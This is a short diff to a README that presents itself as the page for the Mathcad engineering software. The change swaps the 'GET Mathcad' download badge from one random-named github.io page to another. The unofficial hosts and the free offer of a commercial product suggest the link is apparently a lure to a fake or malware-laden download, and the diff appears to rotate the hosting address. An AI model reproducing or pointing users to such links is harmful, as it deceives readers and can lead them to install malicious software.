@@ -1,6 +1,6 @@
 # Mathcad - Engineering Calculation Software
 
-[![GET Mathcad](https://img.shields.io/badge/GET%20%E2%80%94%20Mathcad-0078D6?style=for-the-badge&logoColor=white)](https://jimmymaloneqahj.github.io/.github/mathcad-ptc)
+[![GET Mathcad](https://img.shields.io/badge/GET%20%E2%80%94%20Mathcad-0078D6?style=for-the-badge&logoColor=white)](https://camdenreeddpyg.github.io/.github/mathcad-ptc)
 
 ## Mathcad Engineering Worksheet Overview
 
